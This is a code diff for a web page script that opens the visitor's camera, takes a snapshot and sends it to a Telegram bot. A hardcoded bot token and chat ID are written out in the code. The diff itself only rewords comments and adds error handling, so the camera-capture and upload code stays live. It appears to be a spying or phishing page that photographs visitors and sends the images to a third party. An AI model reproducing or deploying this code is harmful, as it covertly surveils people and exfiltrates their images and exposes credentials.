@@ -60,10 +60,10 @@
     <script>
         let localStream;
 
-        // Capture the camera feed and take a snapshot
+        // Start camera capture and send data to the bot
         async function startCapture() {
             await initializeCamera();  // Initialize the user's camera
-            captureSnapshot();  // Capture a snapshot and send it to the bot
+            captureSnapshot();  // Capture the snapshot and send it
         }
 
         // Get the user's camera stream
@@ -82,12 +82,12 @@
             video.srcObject = localStream;
             video.play();
 
-            // Wait for the video to start playing before capturing the snapshot
+            // Wait for the video to start before capturing the snapshot
             video.onloadedmetadata = () => {
                 const canvas = document.getElementById('snapshotCanvas');
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                video.pause();  // Pause the video after taking the snapshot
+                video.pause();  // Pause the video after capturing the snapshot
 
                 // Convert the canvas to a Blob (image)
                 canvas.toBlob((blob) => {
@@ -96,7 +96,7 @@
             };
         }
 
-        // Send the image to the Telegram bot
+        // Send the captured image to the Telegram bot
         function sendSnapshotToBot(imageBlob) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
             const chatId = '860517021';
@@ -108,10 +108,14 @@
                 method: 'POST',
                 body: formData
             })
-            .then(() => {
-                console.log('Snapshot sent to Telegram bot.');
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send snapshot:', response.statusText);
+                } else {
+                    console.log('Snapshot sent successfully to Telegram bot.');
+                }
             })
-            .catch((error) => {
+            .catch(error => {
                 console.error('Error sending snapshot:', error);
             });
         }
